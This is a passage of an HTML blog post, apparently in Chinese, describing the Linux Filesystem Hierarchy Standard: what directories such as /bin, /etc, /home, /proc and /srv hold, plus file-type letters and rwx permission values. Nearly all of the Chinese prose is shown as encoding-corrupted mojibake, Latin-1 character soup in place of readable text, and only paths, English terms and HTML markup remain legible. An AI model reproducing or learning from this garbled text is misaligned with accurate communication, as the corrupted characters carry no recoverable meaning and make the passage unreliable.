¹ç›®å½•ä¹‹ä¸‹çš„æ—¢å¯ä»¥æ˜¯ç›®å½•ï¼Œä¹Ÿå¯ä»¥æ˜¯æ–‡ä»¶ï¼Œè€Œæ¯ä¸€ä¸ªç›®å½•ä¸­åˆå¯ä»¥åŒ…å«ï¼ˆå­ï¼‰ç›®å½•æˆ–æ–‡ä»¶ã€‚å¦‚æ­¤åå¤å°±å¯ä»¥æ„æˆä¸€ä¸ªåºå¤§çš„æ–‡ä»¶ç³»ç»Ÿã€‚</p><p>ä¸ºäº†é¿å…è¯¸å¤šLinuxå‘è¡Œç‰ˆä½¿ç”¨å„éƒ¨ç›¸åŒçš„æ–‡ä»¶ç³»ç»Ÿç»“æ„ï¼ŒLinuxåŸºé‡‘ä¼šå‘å¸ƒäº†<strong>FHS</strong>æ ‡å‡†ï¼Œå¤šæ•°Linuxå‘è¡Œç‰ˆç³»ç»Ÿéƒ½éµå¾ªè¿™ä¸€æ ‡å‡†ã€‚</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221020073839666-1024x719.png" style="zoom:67%;" /><p><strong>FHSè®¤ä¸ºæ ¹ç›®å½•(&#x2F;)ä¸‹åº”è¯¥åŒ…å«å¦‚ä¸‹å­ç›®å½•</strong></p><p>ï¼ˆå®˜æ–¹ï¼‰</p><p>ç›®å½•</p><p>åº”æ”¾ç½®æ¡£æ¡ˆå†…å®¹</p><p>&#x2F;bin</p><p>ç³»ç»Ÿæœ‰å¾ˆå¤šæ”¾ç½®æ‰§è¡Œæ¡£çš„ç›®å½•ï¼Œä½†&#x2F;binæ¯”è¾ƒç‰¹æ®Šã€‚å› ä¸º&#x2F;binæ”¾ç½®çš„æ˜¯åœ¨å•äººç»´æŠ¤æ¨¡å¼ä¸‹è¿˜èƒ½å¤Ÿè¢«æ“ä½œçš„<strong>æŒ‡ä»¤</strong>ã€‚åœ¨&#x2F;binåº•ä¸‹çš„æŒ‡ä»¤å¯ä»¥è¢«rootä¸ä¸€èˆ¬å¸å·æ‰€ä½¿ç”¨ï¼Œä¸»è¦æœ‰ï¼šcat,chmod(ä¿®æ”¹æƒé™), chown, date, mv, mkdir, cp, bashç­‰ç­‰å¸¸ç”¨çš„æŒ‡ä»¤ã€‚</p><p>&#x2F;boot</p><p>ä¸»è¦æ”¾ç½®<strong>å¼€æœº</strong>ä¼šä½¿ç”¨åˆ°çš„æ¡£æ¡ˆï¼ŒåŒ…æ‹¬Linuxæ ¸å¿ƒæ¡£æ¡ˆä»¥åŠå¼€æœºé€‰å•ä¸å¼€æœºæ‰€éœ€è®¾å®šæ¡£ç­‰ç­‰ã€‚Linux kernelå¸¸ç”¨çš„æ¡£åä¸ºï¼švmlinuz ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯grubè¿™ä¸ªå¼€æœºç®¡ç†ç¨‹å¼ï¼Œåˆ™è¿˜ä¼šå­˜åœ¨&#x2F;boot&#x2F;grub&#x2F;è¿™ä¸ªç›®å½•ã€‚</p><p>&#x2F;dev</p><p>ï¼ˆdeviceï¼‰åœ¨Linuxç³»ç»Ÿä¸Šï¼Œä»»ä½•<strong>è£…ç½®ä¸å‘¨è¾¹è®¾å¤‡</strong>éƒ½æ˜¯ä»¥æ¡£æ¡ˆçš„å‹æ€å­˜åœ¨äºè¿™ä¸ªç›®å½•å½“ä¸­ã€‚ åªè¦é€šè¿‡å­˜å–è¿™ä¸ªç›®å½•ä¸‹çš„æŸä¸ªæ¡£æ¡ˆï¼Œå°±ç­‰äºå­˜å–æŸä¸ªè£…ç½®ã€‚æ¯”è¦é‡è¦çš„æ¡£æ¡ˆæœ‰&#x2F;dev&#x2F;null, &#x2F;dev&#x2F;zero, &#x2F;dev&#x2F;tty , &#x2F;dev&#x2F;lp_, &#x2F; dev&#x2F;hd_, &#x2F;dev&#x2F;sd*ç­‰ç­‰</p><p>&#x2F;etc***</p><p>ç³»ç»Ÿä¸»è¦çš„<strong>è®¾å®šæ¡£</strong>å‡ ä¹éƒ½æ”¾ç½®åœ¨è¿™ä¸ªç›®å½•å†…ï¼Œä¾‹å¦‚<strong>äººå‘˜çš„å¸å·å¯†ç æ¡£ã€å„ç§æœåŠ¡çš„å¯å§‹æ¡£</strong>ç­‰ç­‰ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ä¸ªç›®å½•ä¸‹çš„å„æ¡£æ¡ˆå±æ€§æ˜¯å¯ä»¥è®©ä¸€èˆ¬ä½¿ç”¨è€…æŸ¥é˜…çš„ï¼Œä½†æ˜¯åªæœ‰rootæœ‰æƒåŠ›ä¿®æ”¹ã€‚ FHSå»ºè®®ä¸è¦æ”¾ç½®å¯æ‰§è¡Œæ¡£(binary)åœ¨è¿™ä¸ªç›®å½•ä¸­ã€‚ æ¯”è¾ƒé‡è¦çš„æ¡£æ¡ˆæœ‰ï¼š&#x2F;etc&#x2F;inittab, &#x2F;etc&#x2F;init.d&#x2F;, &#x2F;etc&#x2F;modprobe.conf, &#x2F;etc&#x2F;X11&#x2F;, &#x2F;etc&#x2F;fstab, &#x2F;etc&#x2F;sysconfig&#x2F;ç­‰ç­‰ã€‚ å¦å¤–ï¼Œå…¶ä¸‹é‡è¦çš„ç›®å½•æœ‰ï¼š**&#x2F;etc&#x2F;init.d&#x2F;** ï¼šæ‰€æœ‰æœåŠ¡çš„é¢„è®¾å¯åŠ¨scriptéƒ½æ˜¯æ”¾åœ¨è¿™é‡Œçš„ï¼Œä¾‹å¦‚è¦å¯åŠ¨æˆ–è€…å…³é—­iptablesçš„è¯ï¼š &#x2F;etc&#x2F;init.d&#x2F;iptables startã€&#x2F;etc&#x2F;init.d&#x2F; iptables stop &#x2F;etc&#x2F;xinetd.d&#x2F; ï¼šè¿™å°±æ˜¯æ‰€è°“çš„super daemonç®¡ç†çš„å„é¡¹æœåŠ¡çš„è®¾å®šæ¡£ç›®å½•ã€‚ &#x2F;etc&#x2F;X11&#x2F; ï¼šä¸X Windowæœ‰å…³çš„å„ç§è®¾å®šæ¡£éƒ½åœ¨è¿™é‡Œï¼Œå°¤å…¶æ˜¯xorg.confæˆ–XF86Configè¿™ä¸¤ä¸ªX Serverçš„è®¾å®šæ¡£ã€‚ï¼ˆé…ç½®ä¿¡æ¯ï¼‰</p><p>&#x2F;home</p><p>è¿™æ˜¯ç³»ç»Ÿé¢„è®¾çš„ä½¿ç”¨è€…<strong>å®¶ç›®å½•</strong>(home directory)ã€‚ åœ¨ä½ æ–°å¢ä¸€ä¸ªä¸€èˆ¬ä½¿ç”¨è€…å¸å·æ—¶ï¼Œé¢„è®¾çš„ä½¿ç”¨è€…å®¶ç›®å½•éƒ½ä¼šè§„èŒƒåˆ°è¿™é‡Œæ¥ã€‚æ¯”è¾ƒé‡è¦çš„æ˜¯ï¼Œå®¶ç›®å½•æœ‰ä¸¤ç§ä»£å·ï¼š ~ ï¼šä»£è¡¨å½“å‰ä½¿ç”¨è€…çš„å®¶ç›®å½•ï¼Œè€Œ ~guestï¼šåˆ™ä»£è¡¨ç”¨æˆ·åä¸ºguestçš„å®¶ç›®å½•ã€‚</p><p>&#x2F;lib</p><p>ç³»ç»Ÿçš„å‡½å¼åº“éå¸¸çš„å¤šï¼Œè€Œ&#x2F;libæ”¾ç½®çš„åˆ™æ˜¯åœ¨<strong>å¼€æœºæ—¶ä¼šç”¨åˆ°çš„å‡½å¼åº“</strong>ï¼Œä»¥åŠåœ¨&#x2F;binæˆ–&#x2F;sbinåº•ä¸‹çš„æŒ‡ä»¤ä¼šå‘¼å«çš„å‡½å¼åº“è€Œå·² ã€‚ ä»€ä¹ˆæ˜¯å‡½å¼åº“å‘¢ï¼Ÿå¦³å¯ä»¥å°†ä»–æƒ³æˆæ˜¯å¤–æŒ‚ï¼ŒæŸäº›æŒ‡ä»¤å¿…é¡»è¦æœ‰è¿™äº›å¤–æŒ‚æ‰èƒ½å¤Ÿé¡ºåˆ©å®Œæˆç¨‹å¼çš„æ‰§è¡Œä¹‹æ„ã€‚ å°¤å…¶é‡è¦çš„æ˜¯&#x2F;lib&#x2F;modules&#x2F;è¿™ä¸ªç›®å½•ï¼Œå› ä¸ºè¯¥ç›®å½•ä¼šæ”¾ç½®æ ¸å¿ƒç›¸å…³çš„æ¨¡ç»„(é©±åŠ¨ç¨‹å¼)ã€‚</p><p>&#x2F;media</p><p>mediaæ˜¯åª’ä½“çš„è‹±æ–‡ï¼Œé¡¾åæ€ä¹‰ï¼Œè¿™ä¸ª&#x2F;mediaåº•ä¸‹æ”¾ç½®çš„å°±æ˜¯<strong>å¯ç§»é™¤çš„è£…ç½®</strong>ã€‚ åŒ…æ‹¬è½¯ç¢Ÿã€å…‰ç¢Ÿã€DVDç­‰ç­‰è£…ç½®éƒ½æš‚æ—¶æŒ‚è½½äºæ­¤ã€‚ å¸¸è§çš„æ¡£åæœ‰ï¼š&#x2F;media&#x2F;floppy, &#x2F;media&#x2F;cdromç­‰ç­‰ã€‚</p><p>&#x2F;mnt</p><p>å¦‚æœå¦³æƒ³è¦<strong>æš‚æ—¶æŒ‚è½½æŸäº›é¢å¤–çš„è£…ç½®</strong>ï¼Œä¸€èˆ¬å»ºè®®å¦³å¯ä»¥æ”¾ç½®åˆ°è¿™ä¸ªç›®å½•ä¸­ã€‚åœ¨å¤æ—©æ—¶å€™ï¼Œè¿™ä¸ªç›®å½•çš„ç”¨é€”ä¸&#x2F;mediaç›¸åŒå•¦ã€‚ åªæ˜¯æœ‰äº†&#x2F;mediaä¹‹åï¼Œè¿™ä¸ªç›®å½•å°±ç”¨æ¥æš‚æ—¶æŒ‚è½½ç”¨äº†ã€‚</p><p>&#x2F;opt</p><p>è¿™ä¸ªæ˜¯ç»™<strong>ç¬¬ä¸‰æ–¹ååŠ›è½¯ä½“</strong>æ”¾ç½®çš„ç›®å½• ã€‚ ä»€ä¹ˆæ˜¯ç¬¬ä¸‰æ–¹ååŠ›è½¯ä½“å•Šï¼Ÿä¸¾ä¾‹æ¥è¯´ï¼ŒKDEè¿™ä¸ªæ¡Œé¢ç®¡ç†ç³»ç»Ÿæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è®¡ç”»ï¼Œä¸è¿‡ä»–å¯ä»¥å®‰è£…åˆ°Linuxç³»ç»Ÿä¸­ï¼Œå› æ­¤KDEçš„è½¯ä½“å°±å»ºè®®æ”¾ç½®åˆ°æ­¤ç›®å½•ä¸‹äº†ã€‚ å¦å¤–ï¼Œå¦‚æœä½ æƒ³è¦è‡ªè¡Œå®‰è£…é¢å¤–çš„è½¯ä½“(éåŸæœ¬çš„distributionæä¾›çš„)ï¼Œé‚£ä¹ˆä¹Ÿèƒ½å¤Ÿå°†ä½ çš„è½¯ä½“å®‰è£…åˆ°è¿™é‡Œæ¥ã€‚ ä¸è¿‡ï¼Œä»¥å‰çš„Linuxç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬è¿˜æ˜¯ä¹ æƒ¯æ”¾ç½®åœ¨&#x2F;usr&#x2F;localç›®å½•ä¸‹ã€‚</p><p>&#x2F;root</p><p>ç³»ç»Ÿç®¡ç†å‘˜(<strong>root)çš„å®¶ç›®å½•</strong>ã€‚ ä¹‹æ‰€ä»¥æ”¾åœ¨è¿™é‡Œï¼Œæ˜¯å› ä¸ºå¦‚æœè¿›å…¥å•äººç»´æŠ¤æ¨¡å¼è€Œä»…æŒ‚è½½æ ¹ç›®å½•æ—¶ï¼Œè¯¥ç›®å½•å°±èƒ½å¤Ÿæ‹¥æœ‰rootçš„å®¶ç›®å½•ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¼šå¸Œæœ›rootçš„å®¶ç›®å½•ä¸æ ¹ç›®å½•æ”¾ç½®åœ¨åŒä¸€ä¸ªåˆ†åŒºä¸­ã€‚</p><p>&#x2F;sbin</p><p>Linuxæœ‰éå¸¸å¤šæŒ‡ä»¤æ˜¯ç”¨æ¥è®¾å®šç³»ç»Ÿç¯å¢ƒçš„ï¼Œè¿™äº›æŒ‡ä»¤åªæœ‰rootæ‰èƒ½å¤Ÿåˆ©ç”¨æ¥è®¾å®šç³»ç»Ÿï¼Œå…¶ä»–ä½¿ç”¨è€…æœ€å¤šåªèƒ½ç”¨æ¥æŸ¥è¯¢è€Œå·²ã€‚æ”¾åœ¨&#x2F;sbinåº•ä¸‹çš„ä¸ºå¼€æœºè¿‡ç¨‹ä¸­æ‰€éœ€è¦çš„ï¼Œé‡Œé¢<strong>åŒ…æ‹¬äº†å¼€æœºã€ä¿®å¤ã€è¿˜åŸç³»ç»Ÿæ‰€éœ€è¦çš„æŒ‡ä»¤</strong>ã€‚è‡³äºæŸäº›ä¼ºæœå™¨è½¯ä½“ç¨‹å¼ï¼Œä¸€èˆ¬åˆ™æ”¾ç½®åˆ°**&#x2F;usr&#x2F;sbin&#x2F;<strong>å½“ä¸­ã€‚è‡³äºæœ¬æœºè‡ªè¡Œå®‰è£…çš„è½¯ä½“æ‰€äº§ç”Ÿçš„ç³»ç»Ÿæ‰§è¡Œæ¡£(system binary)ï¼Œåˆ™æ”¾ç½®åˆ°</strong>&#x2F;usr&#x2F;local&#x2F;sbin&#x2F;**å½“ä¸­äº†ã€‚å¸¸è§çš„æŒ‡ä»¤åŒ…æ‹¬ï¼šfdisk, fsck, ifconfig, init, mkfsç­‰ç­‰ã€‚</p><p>&#x2F;srv</p><p>srvå¯ä»¥è§†ä¸ºserviceçš„ç¼©å†™ï¼Œæ˜¯ä¸€äº›ç½‘è·¯æœåŠ¡å¯åŠ¨ä¹‹åï¼Œè¿™äº›æœåŠ¡æ‰€éœ€è¦å–ç”¨çš„<strong>èµ„æ–™ç›®å½•</strong>ã€‚ å¸¸è§çš„æœåŠ¡ä¾‹å¦‚WWW, FTPç­‰ç­‰ã€‚ ä¸¾ä¾‹æ¥è¯´ï¼Œ<strong>WWWä¼ºæœå™¨éœ€è¦çš„ç½‘é¡µèµ„æ–™å°±å¯ä»¥æ”¾ç½®åœ¨&#x2F;srv&#x2F;www&#x2F;é‡Œé¢ã€‚å‘µå‘µï¼Œçœ‹æ¥å¹³æ—¶æˆ‘ä»¬ç¼–å†™çš„ä»£ç åº”è¯¥æ”¾åˆ°è¿™é‡Œäº†ã€‚</strong></p><p>&#x2F;tmp</p><p>è¿™æ˜¯è®©ä¸€èˆ¬ä½¿ç”¨è€…æˆ–è€…æ˜¯æ­£åœ¨æ‰§è¡Œçš„ç¨‹åº<strong>æš‚æ—¶æ”¾ç½®æ¡£æ¡ˆ</strong>çš„åœ°æ–¹ã€‚è¿™ä¸ªç›®å½•æ˜¯ä»»ä½•äººéƒ½èƒ½å¤Ÿå­˜å–çš„ï¼Œæ‰€ä»¥ä½ éœ€è¦å®šæœŸçš„æ¸…ç†ä¸€ä¸‹ã€‚å½“ç„¶ï¼Œé‡è¦èµ„æ–™ä¸å¯æ”¾ç½®åœ¨æ­¤ç›®å½•å•Šã€‚ å› ä¸ºFHSç”šè‡³å»ºè®®åœ¨å¼€æœºæ—¶ï¼Œåº”è¯¥è¦å°†&#x2F;tmpä¸‹çš„èµ„æ–™éƒ½åˆ é™¤ã€‚</p><p>è¿˜æœ‰ä¸‹é¢è¿™äº›</p><p>&#x2F;lost+found</p><p>è¿™ä¸ªç›®å½•æ˜¯ä½¿ç”¨æ ‡å‡†çš„ext2&#x2F;ext3æ¡£æ¡ˆç³»ç»Ÿæ ¼å¼æ‰ä¼šäº§ç”Ÿçš„ä¸€ä¸ªç›®å½•ï¼Œç›®çš„åœ¨äºå½“æ¡£æ¡ˆç³»ç»Ÿå‘ç”Ÿé”™è¯¯æ—¶ï¼Œå°†ä¸€äº›é—å¤±çš„ç‰‡æ®µæ”¾ç½®åˆ°è¿™ä¸ªç›®å½•ä¸‹ã€‚ è¿™ä¸ªç›®å½•é€šå¸¸ä¼šåœ¨åˆ†å‰²æ§½çš„æœ€é¡¶å±‚å­˜åœ¨ï¼Œä¾‹å¦‚ä½ åŠ è£…ä¸€ä¸ªç¡¬ç›˜äº&#x2F;diskä¸­ï¼Œé‚£åœ¨è¿™ä¸ªç³»ç»Ÿä¸‹å°±ä¼šè‡ªåŠ¨äº§ç”Ÿä¸€ä¸ªè¿™æ ·çš„ç›®å½•&#x2F;disk&#x2F;lost+found</p><p>&#x2F;proc</p><p>è¿™ä¸ªç›®å½•æœ¬èº«æ˜¯ä¸€ä¸ª<strong>è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ</strong>(virtual filesystem)å–”ã€‚ ä»–æ”¾ç½®çš„èµ„æ–™éƒ½æ˜¯åœ¨å†…å­˜å½“ä¸­ï¼Œä¾‹å¦‚ç³»ç»Ÿæ ¸å¿ƒã€è¡Œç¨‹èµ„è®¯(process)ï¼ˆæ˜¯è¿›ç¨‹å—?ï¼‰ã€å‘¨è¾¹è£…ç½®çš„çŠ¶æ€åŠç½‘ç»œçŠ¶æ€ç­‰ç­‰ã€‚å› ä¸ºè¿™ä¸ªç›®å½•ä¸‹çš„èµ„æ–™éƒ½æ˜¯åœ¨è®°å¿†ä½“ï¼ˆå†…å­˜ï¼‰å½“ä¸­ï¼Œæ‰€ä»¥æœ¬èº«ä¸å ä»»ä½•ç¡¬ç›˜ç©ºé—´ã€‚æ¯”è¾ƒé‡è¦çš„æ¡£æ¡ˆï¼ˆç›®å½•ï¼‰ä¾‹å¦‚ï¼š &#x2F;proc&#x2F;cpuinfo, &#x2F;proc&#x2F;dma, &#x2F;proc&#x2F;interrupts, &#x2F;proc&#x2F;ioports, &#x2F;proc&#x2F;net&#x2F;*ç­‰ç­‰ã€‚å‘µå‘µï¼Œæ˜¯è™šæ‹Ÿå†…å­˜å—[guest]ï¼Ÿ</p><p>&#x2F;sys</p><p>è¿™ä¸ªç›®å½•å…¶å®è·Ÿ&#x2F;procéå¸¸ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ä¸€ä¸ª<strong>è™šæ‹Ÿçš„æ¡£æ¡ˆç³»ç»Ÿ</strong>ï¼Œä¸»è¦ä¹Ÿæ˜¯è®°å½•ä¸<strong>æ ¸å¿ƒç›¸å…³çš„èµ„è®¯</strong>ã€‚ åŒ…æ‹¬ç›®å‰å·²è½½å…¥çš„æ ¸å¿ƒæ¨¡ç»„ä¸æ ¸å¿ƒä¾¦æµ‹åˆ°çš„ç¡¬ä½“è£…ç½®èµ„è®¯ç­‰ç­‰ã€‚ è¿™ä¸ªç›®å½•åŒæ ·ä¸å ç¡¬ç›˜å®¹é‡ã€‚</p><p>æ¨èåšå®¢</p><p><a href="https://www.cnblogs.com/silence-hust/p/4319415.html">https://www.cnblogs.com/silence-hust/p/4319415.html</a></p><h2 id="ç›®å½•è§£æ"><a href="#ç›®å½•è§£æ" class="headerlink" title="ç›®å½•è§£æ"></a>ç›®å½•è§£æ</h2><h3 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h3><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221025215812113.png"></p><p><strong>æ–‡ä»¶ç±»å‹</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Â [d]  -&gt; directory  ç›®å½•</span><br><span class="line">Â [-]  -&gt; æ–‡ä»¶</span><br><span class="line">Â [l]  -&gt; link  è¿æ¥æ–‡æ¡£ï¼ˆå¿«æ·æ–¹å¼ï¼‰</span><br><span class="line">Â &#123;</span><br><span class="line">Â  Â   [b]  -&gt; è£…ç½®æ–‡ä»¶é‡Œçš„å¯ä¾›å­˜å‚¨çš„æ¥å£è®¾å¤‡ï¼ˆå¯éšæœºå­˜å–è£…ç½®ï¼‰</span><br><span class="line">Â  Â   [c]  -&gt; è£…ç½®æ–‡ä»¶é‡Œé¢çš„ä¸²è¡Œç«¯å£è®¾å¤‡ï¼Œå¦‚é”®ç›˜é¼ æ ‡ï¼ˆä¸€æ¬¡æ€§è¯»å–è£…ç½®ï¼‰</span><br><span class="line">Â &#125;  -&gt; äº†è§£å³å¯</span><br></pre></td></tr></table></figure><p><strong>æƒé™</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Â r  -&gt; è¯»æƒé™  å€¼ï¼š4</span><br><span class="line">Â w  -&gt; å†™æƒé™  å€¼: 2</span><br><span class="line">Â x  -&gt; æ‰§è¡Œæƒé™ å€¼ï¼š1 ï¼ˆå¯¹äºæ™®é€šæ–‡ä»¶ä»£è¡¨æ‰§è¡Œï¼Œå¯¹äºç›®å½•æ–‡ä»¶ä»£è¡¨å¯è¿›å…¥ï¼‰</span><br><span class="line">Â â€‹</span><br><span class="line">Â u  -&gt; userå±ä¸»è®¿é—®æƒé™ï¼ˆæ‹¥æœ‰è€…ï¼‰</span><br><span class="line">Â g  -&gt; groupå±ç»„è®¿é—®æƒé™ï¼ˆå’Œæ‹¥æœ‰è€…åŒç»„çš„äººï¼‰</span><br><span class="line">Â 0  -&gt; otherå…¶ä»–äººè®¿é—®æƒé™</span><br><span class="line">Â â€‹</span><br><span class="line">Â e.g:  drwxrwxr-x</span><br><span class="line">Â  Â  Â   u  g o</span><br></pre></td></tr></table></figure><h3 id="æ ¹ç›®å½•ä¸‹æ‰€æœ‰ç›®å½•"><a href="#æ ¹ç›®å½•ä¸‹æ‰€æœ‰ç›®å½•" class="headerlink" title="æ ¹ç›®å½•ä¸‹æ‰€æœ‰ç›®å½•"></a>æ ¹ç›®å½•ä¸‹æ‰€æœ‰ç›®å½•</h3><h5 id="bin"><a href="#bin" class="headerlink" title="&#x2F;bin"></a>&#x2F;bin</h5><p>binæ˜¯binaryçš„ç¼©å†™ï¼Œè¿™ä¸ªç›®å½•å­˜æ”¾çš„éƒ½æ˜¯äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼Œbinç›®å½•æ”¾ç½®çš„æ˜¯æœ€åŸºæœ¬çš„ä¸€äº›<strong>å‘½ä»¤</strong>çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ¯”å¦‚cpã€mvã€mkdirã€chmodã€chownç­‰ç­‰ã€‚&#x2F;usrä¸‹é¢ä¹Ÿæœ‰ä¸€ä¸ª&#x2F;binç›®å½•ï¼Œå®ƒé‡Œé¢çš„æ–‡ä»¶ä¹Ÿæ˜¯ä¸€äº›å‘½ä»¤çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>binä¸‹å­˜æ”¾ä¸€äº›æ™®é€šçš„åŸºæœ¬å‘½ä»¤ï¼Œå¦‚ls,chmodç­‰ï¼Œè¿™äº›å‘½ä»¤åœ¨Linuxç³»ç»Ÿé‡Œçš„é…ç½®æ–‡ä»¶è„šæœ¬é‡Œç»å¸¸ç”¨åˆ°ã€‚ä¹Ÿå°±æ˜¯ä¸»è¦æ”¾ç½®ä¸€äº›ç³»ç»Ÿçš„å¿…å¤‡æ‰§è¡Œæ¡£</p><h5 id="sbin"><a href="#sbin" class="headerlink" title="&#x2F;sbin"></a>&#x2F;sbin</h5><p>sæ˜¯super userï¼Œä¹Ÿå°±ç®¡ç†å‘˜ã€‚è¿™ä¸ªç›®å½•å’Œ&#x2F;binç›®å½•å¾ˆåƒï¼Œä¹Ÿå­˜æ”¾ç€ä¸€äº›ç¨‹åºï¼Œä¸è¿‡æœ‰äº›ç¨‹åºéœ€è¦å˜æˆç®¡ç†å‘˜æ‰èƒ½æ‰§è¡Œã€‚ä¸»è¦è¿˜æ˜¯æ”¾ç½®ä¸€äº›ç³»ç»Ÿç®¡ç†çš„å¿…å¤‡ç¨‹å¼</p><p>&#x2F;sbin ä¸‹çš„å‘½ä»¤å±äºåŸºæœ¬çš„ç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚shutdownï¼Œrebootï¼Œç”¨äºå¯åŠ¨ç³»ç»Ÿï¼Œä¿®å¤ç³»ç»Ÿ</p><h5 id="etc"><a href="#etc" class="headerlink" title="&#x2F;etc ***"></a>&#x2F;etc ***</h5><p>è¿™ä¸ªç›®å½•ç”¨æ¥å­˜æ”¾æ‰€æœ‰çš„ç³»ç»Ÿç®¡ç†æ‰€éœ€è¦çš„<strong>é…ç½®æ–‡ä»¶</strong>å’Œå­ç›®å½•</p><h5 id="home"><a href="#home" class="headerlink" title="&#x2F;home"></a>&#x2F;home</h5><p><strong>ç”¨æˆ·çš„ä¸»ç›®å½•</strong>ï¼Œåœ¨linuxä¸­ï¼Œæ¯ä¸ªç”¨æˆ·éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ç›®å½•ï¼Œä¸€èˆ¬è¯¥ç›®å½•æ˜¯ä»¥ç”¨æˆ·çš„è´¦å·å‘½åçš„</p><h5 id="lib"><a href="#lib" class="headerlink" title="&#x2F;lib"></a>&#x2F;lib</h5><p>è¿™ä¸ªç›®å½•é‡Œé¢å­˜æ”¾ç€ç³»ç»Ÿæœ€åŸºæœ¬çš„<strong>åŠ¨æ€è¿æ¥å…±äº«åº“</strong>ï¼Œå…¶ä½œç”¨ç±»ä¼¼äºWindowsé‡Œçš„<strong>DLL</strong>æ–‡ä»¶ã€‚å‡ ä¹æ‰€æœ‰çš„åº”ç”¨ç¨‹åºéƒ½éœ€è¦ç”¨åˆ°è¿™äº›å…±äº«åº“ã€‚</p><h5 id="lost-found"><a href="#lost-found" class="headerlink" title="&#x2F;lost+found"></a>&#x2F;lost+found</h5><p>è¿™ä¸ªç›®å½•ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ç©ºçš„ï¼Œå½“ç³»ç»Ÿ<strong>éæ³•å…³æœº</strong>åï¼Œè¿™é‡Œå°±å­˜æ”¾äº†ä¸€äº›æ–‡ä»¶ã€‚</p><h5 id="media"><a href="#media" class="headerlink" title="&#x2F;media"></a>&#x2F;media</h5><p>linuxç³»ç»Ÿä¼šè‡ªåŠ¨è¯†åˆ«ä¸€äº›è®¾å¤‡ï¼Œä¾‹å¦‚Uç›˜ï¼Œå…‰é©±ç­‰ç­‰ï¼Œå½“è¯†åˆ«åï¼Œlinuxä¼šæŠŠè¯†åˆ«çš„è®¾å¤‡æŒ‚è½½åˆ°è¿™ä¸ªç›®å½•ä¸‹ã€‚</p><h5 id="mnt"><a href="#mnt" class="headerlink" title="&#x2F;mnt"></a>&#x2F;mnt</h5><p>ç³»ç»Ÿæä¾›è¯¥ç›®å½•æ˜¯ä¸ºäº†è®©ç”¨æˆ·<strong>ä¸´æ—¶æŒ‚è½½åˆ«çš„æ–‡ä»¶ç³»ç»Ÿ</strong>çš„ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…‰é©±æŒ‚è½½åœ¨&#x2F;mnt&#x2F;ä¸Šï¼Œç„¶åè¿›å…¥è¯¥ç›®å½•å°±å¯ä»¥æŸ¥çœ‹å…‰é©±é‡Œçš„å†…å®¹äº†ã€‚</p><h5 id="opt"><a href="#opt" class="headerlink" title="&#x2F;opt ***"></a>&#x2F;opt ***</h5><p>è¿™ä¸ªç»™ä¸»æœº<strong>é¢å¤–å®‰è£…è½¯ä»¶</strong>æ‰€æ‘†æ”¾çš„ç›®å½•ã€‚æ¯”å¦‚å®‰è£…ä¸€ä¸ªoracleæ•°æ®åº“å°±å¯ä»¥æ”¾åˆ°è¿™ä¸ªç›®å½•ä¸‹ã€‚é»˜è®¤æ˜¯ç©ºçš„ã€‚</p><h5 id="proc"><a href="#proc" class="headerlink" title="&#x2F;proc"></a>&#x2F;proc</h5><p>è¿™ä¸ªç›®å½•æ˜¯ä¸€ä¸ªè™šæ‹Ÿç›®å½•ï¼Œå®ƒæ˜¯ç³»ç»Ÿå†…å­˜çš„æ˜ å°„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æ¥è®¿é—®è¿™ä¸ªç›®å½•æ¥è·å–ç³»ç»Ÿä¿¡æ¯ã€‚<strong>è¿™ä¸ªç›®å½•çš„å†…å®¹ä¸åœ¨ç¡¬ç›˜ä¸Šè€Œæ˜¯åœ¨å†…å­˜é‡Œ</strong></p><h5 id="root"><a href="#root" class="headerlink" title="&#x2F;root"></a>&#x2F;root</h5><p>è¯¥ç›®å½•ä¸ºç³»ç»Ÿç®¡ç†å‘˜ï¼Œä¹Ÿç§°ä½œè¶…çº§æƒé™è€…çš„ç”¨æˆ·ä¸»ç›®å½•</p><h5 id="selinux"><a href="#selinux" class="headerlink" title="&#x2F;selinux"></a>&#x2F;selinux</h5><p>è¿™ä¸ªç›®å½•æ˜¯Redhat&#x2F;centOSæ‰€ç‰¹æœ‰çš„ç›®å½•ï¼Œselinuxæ˜¯ä¸€ä¸ªå®‰å…¨æœºåˆ¶ï¼Œç±»ä¼¼äºWindowsçš„<strong>é˜²ç«å¢™</strong>ï¼Œä½†æ˜¯è¿™å¥—æœºåˆ¶æ¯”è¾ƒå¤æ‚ï¼Œè¿™ä¸ªç›®å½•å°±æ˜¯å­˜æ”¾selinuxç›¸å…³çš„æ–‡ä»¶çš„ã€‚</p><h5 id="srv"><a href="#srv" class="headerlink" title="&#x2F;srv"></a>&#x2F;srv</h5><p>è¯¥ç›®å½•å­˜æ”¾ä¸€äº›æœåŠ¡å¯åŠ¨ä¹‹åéœ€è¦<strong>æå–çš„æ•°æ®</strong></p><h5 id="sys"><a href="#sys" class="headerlink" title="&#x2F;sys"></a>&#x2F;sys</h5><p>è¿™æ˜¯Linux2.6å†…æ 